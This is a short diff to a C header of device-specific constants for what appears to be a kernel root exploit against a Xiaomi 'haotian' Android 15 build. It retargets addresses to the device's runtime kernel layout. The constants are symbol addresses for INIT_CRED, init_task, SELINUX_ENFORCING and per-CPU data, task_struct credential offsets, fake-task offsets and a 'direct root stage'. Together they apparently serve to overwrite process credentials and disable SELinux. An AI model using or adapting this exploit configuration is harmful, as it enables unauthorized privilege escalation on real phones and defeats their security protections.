@@ -6,8 +6,8 @@
 #define BUILD_FINGERPRINT "Xiaomi/haotian/haotian:15/AP3A.240905.015.A2/OS2.0.206.0.VOBCNXM:user/release-keys"
 #endif
 
-/* ===== Compile-time KIMAGE_TEXT_BASE ===== */
-#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
+/* ===== KIMAGE_TEXT_BASE (matching device kallsyms _text) ===== */
+#define KIMAGE_TEXT_BASE 0xffffffdcf4e00000ULL
 
 /* ===== Physical memory layout (from iomem) ===== */
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
@@ -24,19 +24,19 @@
 /* ===== Page size ===== */
 #define PAGE_SIZE 4096
 
-/* ===== Slide stage: image (compile-time) addresses ===== */
-#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffffc0a0d2270ULL
-#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc0a0d21c0ULL
-#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc0a1f8b88ULL
-#define SLIDE_INIT_TASK_IMAGE 0xffffffc0a0de280ULL
-#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffffc0a2d4580ULL
-#define SLIDE_SYSCTL_BOOTID_IMAGE 0xffffffc0a336f58ULL
+/* ===== Slide stage: image addresses (from IonStack-verified offsets) ===== */
+#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffffdcf6ed2270ULL
+#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffdcf6ed21c0ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffdcf61f8b88ULL
+#define SLIDE_INIT_TASK_IMAGE 0xffffffdcf6ede280ULL
+#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffffdcf70d4580ULL
+#define SLIDE_SYSCTL_BOOTID_IMAGE 0xffffffdcf7136f58ULL
 
-/* ===== Direct root stage: image addresses ===== */
-#define PER_CPU_OFFSET 0xffffffc0a0cb658ULL
-#define ENTRY_TASK 0xffffffc0a096328ULL
-#define INIT_CRED 0xffffffc0a0f0548ULL
-#define SELINUX_ENFORCING 0xffffffc0a07cae0ULL
+/* ===== Direct root stage: image addresses (from device kallsyms) ===== */
+#define PER_CPU_OFFSET 0xffffffdcf6ecb658ULL
+#define ENTRY_TASK 0xffffffdcf6e96328ULL
+#define INIT_CRED 0xffffffdcf6ef0548ULL
+#define SELINUX_ENFORCING 0xffffffdcf6e7cae0ULL
 
 /* ===== task_struct offsets (from BTF, kernel 6.6) ===== */
 #define TASK_REAL_CRED_OFF 0x818
@@ -84,6 +84,6 @@
 #define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938
 
 /* ===== PSELECT waiter word shift ===== */
-#define PSELECT_WAITER_WORD_SHIFT 1
+#define PSELECT_WAITER_WORD_SHIFT 0
 
 #endif
